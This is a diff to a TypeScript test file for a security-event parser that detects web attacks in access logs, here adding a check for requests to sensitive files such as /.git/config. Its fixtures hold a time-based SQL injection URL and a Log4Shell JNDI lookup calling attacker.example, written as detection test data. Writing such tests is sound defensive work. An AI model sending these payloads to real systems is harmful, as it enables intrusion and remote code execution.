@@ -4,8 +4,13 @@ import OcsfSeverity from "../../../Types/SecurityEvent/OcsfSeverity";
 import SecurityEventRequestOutcome, {
   SECURITY_REQUEST_ATTRIBUTES,
 } from "../../../Types/SecurityEvent/SecurityEventRequestOutcome";
-import WebAttackLogParser from "../../../Utils/SecurityEvent/LogParsers/WebAttackLogParser";
+import WebAttackLogParser, {
+  WEB_ATTACK_KIND_ATTRIBUTE,
+  WEB_SENSITIVE_FILE_PATH_ATTRIBUTE,
+  WebAttackKind,
+} from "../../../Utils/SecurityEvent/LogParsers/WebAttackLogParser";
 import { applyRequestAssessment } from "../../../Utils/SecurityEvent/RequestFollowUp";
+import { resolveClientAddress } from "../../../Utils/SecurityEvent/ClientAddressTrust";
 import { RequestTraceAssessment } from "../../../Utils/SecurityEvent/RequestOutcome";
 import { WEB_LINES, logLine } from "./LogParsers/LogParserFixtures";
 
@@ -35,9 +40,15 @@ function eventFrom(body: string): NormalizedSecurityEvent {
   return events[0]!;
 }
 
+/*
+ * What a trace says, its server span naming its client by the connection's
+ * own address (the peer): an address the sender could not have written.
+ */
 function assessment(
   overrides: Partial<RequestTraceAssessment> = {},
 ): RequestTraceAssessment {
+  const clientAddress: string = overrides.clientAddress ?? "198.51.100.23";
+
   return {
     outcome: SecurityEventRequestOutcome.Rejected,
     serverSpanId: "aaaaaaaaaaaaaaaa",
@@ -45,7 +56,8 @@ function assessment(
     method: "get",
     url: "https://oneuptime.com/sitemap.xml?offset=1;SELECT%20IF((SLEEP(16)),1,2356)",
     route: "",
-    clientAddress: "198.51.100.23",
+    clientAddress,
+    client: resolveClientAddress({ peer: clientAddress }),
     userAgent: "Mozilla/5.0 (compatible; scanner)",
     userId: "",
     durationMs: 3.4,
@@ -245,6 +257,36 @@ describe("applyRequestAssessment", () => {
     expect(event.severityName).toBe(OcsfSeverity.High);
     // The lookup was in a header, so the message still says it.
     expect(event.message).toContain("${jndi:ldap://attacker.example/a}");
+  });
+
+  /*
+   * #10745: a request for a sensitive file, followed into its trace, is
+   * judged again like any web attack - and stays the request it was, the
+   * path the rule counts kept.
+   */
+  test("a request for a sensitive file stays one, its path kept, and says the answer", () => {
+    const event: NormalizedSecurityEvent = eventFrom(
+      '198.51.100.23 - - [24/Nov/2026:10:00:00 +0000] "GET /.git/config HTTP/1.1" 404 153 "-" "zgrab/0.x"',
+    );
+
+    expect(event.attributes[WEB_ATTACK_KIND_ATTRIBUTE]).toBe(
+      WebAttackKind.SensitiveFile,
+    );
+
+    applyRequestAssessment(
+      event,
+      assessment({ url: "https://shop.example/.git/config" }),
+    );
+
+    expect(event.attributes[WEB_ATTACK_KIND_ATTRIBUTE]).toBe(
+      WebAttackKind.SensitiveFile,
+    );
+    expect(event.attributes[WEB_SENSITIVE_FILE_PATH_ATTRIBUTE]).toBe("/.git");
+    expect(event.severityName).toBe(OcsfSeverity.Low);
+    expect(event.message.startsWith("Request for a sensitive file: GET ")).toBe(
+      true,
+    );
+    expect(event.message.endsWith("/.git/config → 404")).toBe(true);
   });
 
   test("an event that is not a web attack keeps its message and severity", () => {
